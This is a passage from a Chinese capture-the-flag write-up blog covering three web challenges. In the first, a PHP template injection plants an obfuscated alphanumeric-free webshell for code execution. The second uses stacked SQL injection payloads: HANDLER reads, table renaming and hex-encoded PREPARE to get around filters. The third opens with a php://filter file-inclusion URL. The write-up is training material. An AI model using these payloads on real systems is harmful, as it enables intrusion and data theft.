class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt; </span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Simple Linux&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span><br><span class="line">&lt;!--[<span class="keyword">if</span> IE]&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;![<span class="keyword">endif</span>]--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">jq22</span>-<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">wrap</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">html</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>&quot; <span class="title">checked</span>&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">In</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">Up</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">check</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">class</span>=&quot;<span class="title">check</span>&quot; <span class="title">checked</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">check</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;/<span class="title">span</span>&gt; <span class="title">Keep</span> <span class="title">me</span> <span class="title">Signed</span> <span class="title">in</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">forgot</span>&quot;&gt;<span class="title">Forgot</span> <span class="title">Password</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Website</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">website</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Punctuation</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">punctuation</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">Up</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot;&gt;<span class="title">Already</span> <span class="title">Member</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>审计上方代码发现存在file_put_contents，可以对php文件写入一句话木马。</p><p>有四个选择，选哪个好呢？接下来我们看看template.html，并找到关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        &lt;li&gt;&lt;span class=&quot;adminImg&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$user = ((string)__USER__);</span><br><span class="line">$pass = ((string)__PASS__);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span><br><span class="line">echo($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &lt;ul class=&quot;item&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;系统设置&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;使用指南 &lt;b&gt;&lt;/b&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;关于我们&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;退出系统&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>只有__PUNC__是最好利用的，但是问号被过滤了，想要让它解析php，这时就需要它在上面的php里面，但是上面的php被闭合过了，但是我们又发现其实__USER__，__PASS__这些都是可控的，我们可以使用多行注释来解决问题。最后再把后面的注释掉就行，不然标签闭合会出现问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注册时用户名为a/*</span><br><span class="line">密码为a</span><br><span class="line">website为a</span><br><span class="line">描述为*/);$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*</span><br><span class="line">即可，无数字字母rce，简单的很</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png" alt="image-20241129185322665"></p><p>查看网页源代码即可获取flag</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>sql注入题</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png" alt="image-20241201081543495"></p><p>存在过滤，不好直接联合注入啊</p><p>试试堆叠</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png" alt="image-20241201081821727" style="zoom:67%;" /><p>存在堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png" alt="image-20241201081952743" style="zoom:67%;" /><p>但是这里select等被过滤了，该怎么办呢？</p><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><blockquote><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png" alt="image-20241201082223713"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;64bfe910-ba05-4133-8fdf-11bdf68fd5ce&#125;</span><br></pre></td></tr></table></figure><p>以上为第一种方法</p><p>还有两种思路！！！</p><p><strong>方法一：</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png" alt="image-20241201082453677" style="zoom:67%;" /><p>直接查1，搜到的是words表的相关内容，而搜不到flag表的相关内容，那么我们可不可以把flag表变成words表呢，那不就可以直接搜到flag表的内容了吗？！</p><blockquote><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png" alt="image-20241201082658543"></p><p><strong>方法二：</strong></p><blockquote><p>因为select被过滤了，所以先将select * from <code>1919810931114514</code>进行16进制编码</p><p>再通过构造payload得</p><p>1’;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p><p>进而得到flag</p></blockquote><p>prepare…from…是预处理语句，会进行编码转换。</p><p>execute用来执行由SQLPrepare创建的SQL语句。</p><p>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><h2 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28418/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span 